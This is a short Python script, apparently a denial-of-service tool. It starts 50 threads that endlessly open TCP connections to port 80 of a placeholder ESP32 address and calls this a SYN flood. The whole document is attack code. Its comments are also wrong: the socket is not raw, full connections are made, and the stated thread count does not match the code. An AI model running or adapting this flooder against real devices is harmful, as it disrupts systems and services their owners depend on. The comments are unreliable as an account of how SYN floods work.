import socket
import random
import threading

target = "ip-address of ESP32"
target_port = 80          # Common port (adjust as needed)

def syn_flood():
    while True:
        try:
            # Create a raw socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            # Connect to initiate SYN packet (no full handshake)
            s.connect((target, target_port))
            print(f"SYN packet sent to {target}:{target_port}")
            s.close()
        except:
            print("SYN packet failed")

# Start 40 threads (adjust if needed)
for _ in range(50):
    t = threading.Thread(target=syn_flood)
    t.start()